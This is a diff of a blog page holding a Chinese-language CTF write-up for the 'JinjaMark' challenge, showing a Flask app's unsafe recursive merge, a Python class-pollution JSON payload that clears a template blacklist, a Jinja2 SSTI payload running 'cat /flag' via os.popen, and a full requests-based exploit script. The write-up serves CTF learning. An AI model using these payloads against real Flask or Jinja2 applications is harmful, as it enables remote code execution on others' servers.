@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="jinjamark&#x2F;index 尝试ssti：Hello 别急着ssti注入嘛，先去&#x2F;magic那里给我变个魔术 &#x2F;flag 直接bp爆破数字，得到： 123456789101112131415161718192021BLACKLIST_IN_index &#x3D; [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]def merge(src, d">
+    <meta name="description" content="# jinjamark  &#x2F;index  尝试ssti：Hello 别急着ssti注入嘛，先去&#x2F;magic那里给我变个魔术  &#x2F;flag  直接bp爆破数字，得到：  123456789101112131415161718192021BLACKLIST_IN_index &#x3D; [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]def merge(src, dst):">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JinjaMark">
 <meta property="og:url" content="https://lily2663.github.io/2026/04/09/JinjaMark/index.html">
 <meta property="og:site_name" content="lily&#39;epitaph">
-<meta property="og:description" content="jinjamark&#x2F;index 尝试ssti：Hello 别急着ssti注入嘛，先去&#x2F;magic那里给我变个魔术 &#x2F;flag 直接bp爆破数字，得到： 123456789101112131415161718192021BLACKLIST_IN_index &#x3D; [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]def merge(src, d">
+<meta property="og:description" content="# jinjamark  &#x2F;index  尝试ssti：Hello 别急着ssti注入嘛，先去&#x2F;magic那里给我变个魔术  &#x2F;flag  直接bp爆破数字，得到：  123456789101112131415161718192021BLACKLIST_IN_index &#x3D; [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]def merge(src, dst):">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-04-09T12:56:00.000Z">
-<meta property="article:modified_time" content="2026-05-21T09:30:58.967Z">
+<meta property="article:modified_time" content="2026-05-21T11:11:17.278Z">
 <meta property="article:author" content="Li1yZer0">
 <meta property="article:tag" content="Jinja2">
 <meta property="article:tag" content="Prototype Pollution">
@@ -96,9 +96,6 @@
 </ul>
 
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jinjamark"><span class="toc-number">1.</span> <span class="toc-text">jinjamark</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag"><span class="toc-number">1.1.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">1.2.</span> <span class="toc-text">Exp</span></a></li></ol></li></ol>
-    </div>
   </span>
 </div>
 
@@ -132,27 +129,48 @@
 
     </div>
   </header>
+
+  <!-- Inline TOC -->
+  
+  
+
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="jinjamark"><a href="#jinjamark" class="headerlink" title="jinjamark"></a>jinjamark</h1><p>&#x2F;index</p>
-<p>尝试ssti：Hello 别急着ssti注入嘛，先去&#x2F;magic那里给我变个魔术</p>
-<p>&#x2F;flag</p>
-<p>直接bp爆破数字，得到：</p>
+    
+
+# jinjamark
+
+/index
+
+尝试ssti：Hello 别急着ssti注入嘛，先去/magic那里给我变个魔术
+
+/flag
+
+直接bp爆破数字，得到：
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BLACKLIST_IN_index = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):<span class="comment">#hasattr() 函数用于判断对象是否包含对应的属性。</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/magic&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollute</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;这个魔术还行吧&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我要json的魔术&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>分析，依旧使用了merge合并为字典，于是可以进行修改最后的blacklist的值</p>
+分析，依旧使用了merge合并为字典，于是可以进行修改最后的blacklist的值
+
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="emphasis">__class__</span>返回该对象所属的类</span><br><span class="line">利用<span class="emphasis">__init__</span>拿到初始化函数</span><br><span class="line">利用<span class="emphasis">__globals__</span>得到所有的函数相关的方法</span><br><span class="line">最后改变其中BLACKLIST_IN_index的值</span><br></pre></td></tr></table></figure>
 
-<p>构造：</p>
+构造：
+
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;BLACKLIST_IN_index&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p>污染使得index可以执行ssti语句：</p>
+污染使得index可以执行ssti语句：
+
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span>lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;).read()<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;j1nj<span class="built_in">a_pr0t0</span>_p0llut10n_2_rce&#125;</span><br></pre></td></tr></table></figure>
+## Flag
 
-<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.imxbt.cn:32101&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Prototype pollution to clear blacklist</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/magic&quot;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: SSTI to RCE</span></span><br><span class="line">r = s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;j1nj<span class="built_in">a_pr0t0</span>_p0llut10n_2_rce&#125;</span><br></pre></td></tr></table></figure>
+
+## Exp
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.imxbt.cn:32101&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Prototype pollution to clear blacklist</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/magic&quot;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: SSTI to RCE</span></span><br><span class="line">r = s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
 
 
   </div>
@@ -167,16 +185,12 @@
 
     <div id="nav-footer" style="display: none">
       <ul>
-         
+        
           <li><a href="/">首页</a></li>
-         
+        
           <li><a href="/archives/">写作</a></li>
         
       </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jinjamark"><span class="toc-number">1.</span> <span class="toc-text">jinjamark</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag"><span class="toc-number">1.1.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">1.2.</span> <span class="toc-text">Exp</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -197,7 +211,7 @@
 
     <div id="actions-footer">
       <ul>
-        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="toc"><a class="icon" href="#article-toc"><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
         <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
         <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
         <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
@@ -351,24 +365,15 @@ $(function() {
   });
 
   $(document).ready(function() {
-    // 监听目录点击
-    $(document).on('click', '#toc a', function(e) {
-      // 找到链接对应的 ID (处理了中文编码问题)
+    // TOC 平滑滚动
+    $(document).on('click', '#article-toc a', function(e) {
       var href = $(this).attr('href');
       if (href && href.startsWith('#')) {
         e.preventDefault();
         var targetId = decodeURIComponent(href.substring(1));
-        var $target = $('#' + targetId.replace(/\./g, '\\.')); // 处理 ID 中可能存在的点号
-
+        var $target = $('#' + targetId.replace(/\./g, '\\.'));
         if ($target.length) {
-          // 加上偏移量，防止标题被顶部的导航栏遮挡
-          var targetOffset = $target.offset().top - 30; 
-          
-          $('html, body').animate({
-            scrollTop: targetOffset
-          }, 500); // 500ms 平滑滚动
-
-          // 更新 URL 地址栏，方便别人点进来直接定位
+          $('html, body').animate({ scrollTop: $target.offset().top - 30 }, 400);
           history.pushState(null, null, '#' + targetId);
         }
       }
